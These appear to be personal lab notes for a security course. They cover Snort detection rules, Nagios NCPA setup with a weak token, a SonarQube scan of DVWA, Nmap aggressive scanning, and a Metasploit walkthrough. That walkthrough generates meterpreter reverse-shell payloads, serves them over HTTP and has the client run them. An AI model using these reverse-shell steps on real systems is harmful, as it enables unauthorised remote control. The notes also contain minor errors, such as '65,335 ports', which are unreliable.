Snort :-

sudo systemctl status snort
sudo apt-get install snort -y
192.168.74.0/24   
cd /etc/snort
sudo vim snort.conf 

   search  /Home_NET  (give ip)
   ipvar External_NET !$HOME_NET

sudo systemctl restart snort
cd rules/

for Comment all rules of snort :-
sudo sed -i 's/^include \$RULE_PATH/#include \$RULE_PATH/' snort.conf 

sudo vim local.rules 

Rules 

alert icmp any any -> $HOME_NET any (msg:"ICMP Ping Detected"; sid:1000001; rev:1;)   
alert tcp any any -> $HOME_NET 80 (msg:"Suspicious User-Agent"; content:"evilbot"; http_header; sid:1000002; rev:1;)
alert ip any any -> any any (msg:"Potential MAC Flooding - High Packet Rate"; detection_filter: track by_src, count 1000, seconds 10; sid:1000010; rev:1;)
alert tcp any any -> $HOME_NET any (msg:"SYN Flood Attack Detected (Single Source)"; flags:S; detection_filter:track by_src, count 10, seconds 5; sid:1000020; rev:1;) 


sudo systemctl restart snort
sudo systemctl reload snort

cd ..
#Test
sudo snort -T -i ens37 -c snort.conf 

#Live logs in console 
sudo snort -A console -q -c snort.conf 

#ping and seen output
 


--------------------------------------------------------------------------------------------------------------------------------------------------------

Nagios NCPA Client :-

open nagious in browser 
configuration -> configuration wizards 
search -> Linux /Windowa (Select NCPA Wala)

go to download -> scroll down select Linux -> select DEB vala
in client ubuntu 
sudo su
 copy all and install in client ubuntu 

-----------or ------------------

Installation of Nagios Repo
Execute the following commands:

sudo su
apt-get install apt-transport-https
sudo mkdir -m 0755 -p /etc/apt/keyrings/

curl -fsSL https://repo.nagios.com/GPG-KEY-NAGIOS-V3 | sudo gpg --dearmor -o /etc/apt/keyrings/GPG-KEY-NAGIOS-V3.gpg

echo "Types: deb
URIs: https://repo.nagios.com/deb/$(lsb_release -cs)
Suites: /
Signed-By: /etc/apt/keyrings/GPG-KEY-NAGIOS-V3.gpg" | sudo tee /etc/apt/sources.list.d/nagios.sources > /dev/null

sudo apt-get update
If you are using an older OS or would like to use the legacy (less secure) method follow these steps:

apt-get install apt-transport-https
echo "deb https://repo.nagios.com/deb/$(lsb_release -cs) /" > /etc/apt/sources.list.d/nagios.list

wget -qO - https://repo.nagios.com/GPG-KEY-NAGIOS-V3 | apt-key add -

apt-get update
Installation and Upgrade of NCPA
apt-get install ncpa


# then imp COmmand

sudo vim /usr/local/ncpa/etc/ncpa.cfg
search -> /community_string 
then edit it to 
community_string = redhat

sudo systemctl restart ncpa
sudo systemctl reload ncpa


# then go to nagious browser and enter requirments 
ip
port 5693
token = redhat
select = ubuntu

then select all and finish
go tath 2 link and screen shot done 


---------------------------------------------------------------------------------------------------------------------------------------------------------
Sonarqube :-

pull and run docker Image :-
docker container prune
docker ps -a
docker pull sonarqube:community
docker run -d  --name sonar-api --restart unless-stopped -p 9000:9000 sonarqube:community
#go to browser 127.0.0.1:9000
Access Web :-
user & pass --> admin

#Local project -> give name -> is coustom -> creat project-> locally-> geenerqate -> copy -> continue -> 2 main pyhton 

in Kali
vulnerable dir to scan :-
git clone https://github.com/digininja/DVWA.git
cd DVWA 
apt install python3-pip -y

and run command from sonar cube web portal given in python 


---------------------------------------------------------------------------------------------------------------------------------------------------------

Metasploit :-

msfdb reinit
msfconsole
use payload/linux/x64/meterpreter/reverse_tcp   |  use payload/windows/x64/meterpreter/reverse_tcp
set LHOST 
set LPORT
generate -f elf -o ~/home/payload/abc.elf       |  generate -f exe/raw -o ~/home/payload/abc.exe/raw
back 

Activate Listener :-

use multi/handler
set LHOST 
set LPORT
set PAYLOAD linux/x64/meterpreter/reverse_tcp   |  set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit

Webhost Payload from the Directory :-
cd ~/home/payload/
python3 -m http.server --bind <ip-kali> <port_any_but_not_LPORT>

CLient :- 
Access Website DOwnload Payload 
http://<ip-kali>:<port_any_but_not_LPORT>
chmod +x abc.elf
./abc.elf

After This go to Kali :-
meterpreter > shell 
              script /dev/null -qc bash

Meterpreter Command :

help 'OR' ?: Display the help menu
migrate <PID> 
ps
upload <local> <remote>
download <remote> <local>
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

NMAP :-


The -A (Aggressive Scan) option is a shortcut that automatically enables:
-A 
├── -O                
├── -sV               
├── -sC               
└── --traceroute      
→ OS Detection 
→ Version Detection 
→ Default NSE Scripts 
→ Traceroute



sudo nmap \ -sS \ -sV \ -sC \ -O \ -A \ -p- \ --version-all \ --reason \ --traceroute \ --script "default,vuln,safe" \ -T4 \ -oA full_report \ 
192.168.74.130


sudo  Runs Nmap with root privileges.
-sS – Performs a TCP SYN stealth scan.
-sV – Detects service and software versions.
-sC – Runs default scripts.
-O – Detects target Operating System.
-A – Enables OS, version, script, and traceroute detection.
-p- – Scans all 65,335 ports.
--version-all – Tries every available version probe.
--reason – Shows why a port is open or closed.
--traceroute – Maps network hops to the target.
--script "default,vuln,safe" – Runs default, vulnerability, and safe scripts.
-T4 – Sets aggressive speed timing.
-oA full_report – Saves output in three file formats.
